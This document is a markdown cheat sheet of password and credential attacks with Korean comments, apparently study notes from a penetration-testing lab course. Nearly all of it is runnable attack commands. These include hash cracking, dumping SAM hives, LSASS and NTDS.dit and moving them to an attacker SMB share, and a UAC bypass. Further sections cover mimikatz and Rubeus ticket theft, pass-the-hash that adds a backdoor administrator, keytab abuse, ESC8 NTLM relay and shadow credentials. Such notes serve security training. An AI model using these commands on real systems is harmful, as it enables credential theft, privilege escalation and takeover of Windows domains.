# Password Attack
- hash에 대해서 항상 cracking을 먼저 시도해본 뒤에 `pass the hash` 사용
## shasum
```bash
echo -n <password> | sha1sum
echo -n <password> | sha256sum
echo -n <password> | md5sum
```
## cewl
```bash
cewl -m 2 --with-numbers --lowercase <url>
```
## hashcat
```bash
hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt

hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'

# 새로운 rule 만들기
hashcat -r rules cewl.txt --stdout > output

# output 뒤에 output을 붙이는 과정
hashcat -a 1 output output --stdout > final
```
## Cracking OpenSSL encrypted GZIP files
```bash
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```
## Cracking BitLocker-encrypted drives(vhd file)
```bash
bitlocker2john -i Backup.vhd > backup.hashes

grep "bitlocker\$0" backup.hashes > backup.hash

cat backup.hash
```
```bash
sudo mkdir -p /media/bitlocker

sudo mkdir -p /media/bitlockermount

sudo losetup -f -P Backup.vhd

sudo losetup -a

sudo kpartx -av /dev/loop0

ls /dev/mapper

sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker

sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount

cd /media/bitlockermount/

sudo umount /media/bitlockermount

sudo umount /media/bitlocker
```
## default credentials
```bash
pip3 install defaultcreds-cheat-sheet

creds search linksys
```
## Attacking SAM, SYSTEM, and SECURITY
```powershell
reg.exe save hklm\sam C:\sam.save

reg.exe save hklm\system C:\system.save

reg.exe save hklm\security C:\security.save
```
```bash
sudo impacket-smbserver -smb2support CompData /home/ltnbob/Documents/
```
- `CompData` : 공유 이름
- `/home/ltnbob/Documents/` : 실제 공유 경로
```powershell
move sam.save \\10.10.15.16\CompData

move security.save \\10.10.15.16\CompData

move system.save \\10.10.15.16\CompData
```
```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```
## DCC2 hashes
```bash
# secretsdump로 덤핑 했을 때 나옴.
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25

hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```
## Remote Dumping
```bash
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
## Dumping LSASS
```powershell
# RDP login
1. Open Task Manager
2. Select the Processes tab
3. Find and right click the Local Security Authority Process
4. Select Create dump file
```
```powershell
# Find LSASS's PID In cmd
tasklist /svc

# Find LSASS's PID In Powershell
Get-Process lsass

# 관리자 권한 + SeDebugPrivilege 
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <pid> C:\lsass.dmp full
```
```bash
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```
## credentials with cmdkey
```powershell
cmdkey /list
```
<img width="567" height="126" alt="image" src="https://github.com/user-attachments/assets/d6cb984e-57e5-4846-8b63-b896908a3aec" />

- Interactive means that the credential is used for interactive logon sessions.
```powershell
runas /savecred /user:SRV01\mcharles cmd
```
```powershell
# administrators group에 속해있는지 확인
whoami /all

# UAC bypass
reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe

reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe

mimikatz.exe

privilege::debug

sekurlsa::credman

vault::cred
```
<img width="822" height="359" alt="image" src="https://github.com/user-attachments/assets/cf12ff6c-14ab-4a65-8793-7cdc70c14cf0" />
## Creating a custom list of usernames
```bash
./username-anarchy -i /home/ltnbob/names.txt

./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```
## NTDS.dit
```powershell
net user <user>

net user <user> /domain
```
- `NTDS.dit`를 얻기 위해서 Administrators 그룹이거나 Domain Admins 그룹에 속해 있어야 한다.
<img width="955" height="265" alt="image" src="https://github.com/user-attachments/assets/446d1628-350e-4158-84a3-441c2a263655" />

```powershell
vssadmin CREATE SHADOW /For=C:

cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```
```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```
```bash
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```

## Passwords Hunting
- 내부 폴더 및 파일들을 자세하게 살펴서 패스워드가 노출되었는지 확인해야함.
```powershell
start LaZagne.exe all

findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

Snaffler.exe -s

# PowerHuntShares
Import-Module .\\PowerHuntShares.psm1

Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```
```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

find /home/* -type f -name "*.txt" -o ! -name "*.*"

for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

cat /etc/crontab

ls -la /etc/cron.*/

tail -n5 /home/*/.bash*

for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

sudo python3 mimipenguin.py

sudo python2.7 laZagne.py all

ls -l .mozilla/firefox/ | grep default

cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

python3.9 firefox_decrypt.py

python3 laZagne.py browsers

docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'

nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw" --smb-timeout 60
```

## Linux Old Passwords
```bash
sudo cat /etc/security/opasswd
```

## Cracking Linux Passwords
```bash
sudo cp /etc/passwd /tmp/passwd.bak

sudo cp /etc/shadow /tmp/shadow.bak

unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

## Network Traffic passwords hunting
```bash
git clone https://github.com/lgandx/PCredz

./Pcredz -f demo.pcapng -t -v
```
- `pcap`, `pcapng` : wireshark로 분석

## Pass The Hash
```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

cd C:\tools\Invoke-TheHash\
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "<payload>"
```
```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

# Enable Restricted Admin Mode to allow PtH
# c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

## Pass the Ticket
- To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.
```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::tickets /export

Rubeus.exe dump /nowrap
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
dir \\DC01.inlanefreight.htb\c$

mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

dir \\DC01.inlanefreight.htb\c$
Enter-PSSession -ComputerName DC01
whoami
hostname

Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

## Pass the Key aka. OverPass the Hash
```powershell
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```
<img width="1123" height="287" alt="image" src="https://github.com/user-attachments/assets/28898ca9-5765-4043-ae18-e47eb247b25e" />

```powershell
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
- Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

## Convert .kirbi to Base64 Format and PTT
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))

Rubeus.exe ptt /ticket:<base64 format>
```

## realm - Check if Linux machine is domain-joined
```bash
realm list

ps -ef | grep -i "winbind\|sssd"

find / -name *keytab* -ls 2>/dev/null

crontab -l

id julio@inlanefreight.htb
```
<img width="1164" height="554" alt="image" src="https://github.com/user-attachments/assets/568b191c-fb0a-4737-b7fd-f1669cd370bf" />

## Abusing KeyTab files
```bash
klist -k -t /opt/specialfiles/carlos.keytab

klist
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist
smbclient //dc01/carlos -k -c ls
```

## KeyTab Extract
```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

su - carlos@inlanefreight.htb
```

## Importing the ccache file into our current session
```bash
klist
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist
smbclient //dc01/C$ -k -c ls -no-pass

export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
proxychains impacket-wmiexec dc01 -k

sudo apt-get install krb5-user -y
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```
<img width="612" height="389" alt="image" src="https://github.com/user-attachments/assets/63821327-613c-4d07-9e13-94bf34d85519" />

## ccache to kirbi
```bash
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```
```powershell
C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
klist
dir \\dc01\julio
```

## Linikatz download and execution
```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
/opt/linikatz.sh
```

## AD CS NTLM Relay Attack (ESC8)
```bash
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication

# trigger
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12

python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache

export KRB5CCNAME=/tmp/dc.ccache

impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

## Shadow Credentials (msDS-KeyCredentialLink)
```bash
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

export KRB5CCNAME=/tmp/jpinkman.ccache

klist

cat /etc/krb5.conf

evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```
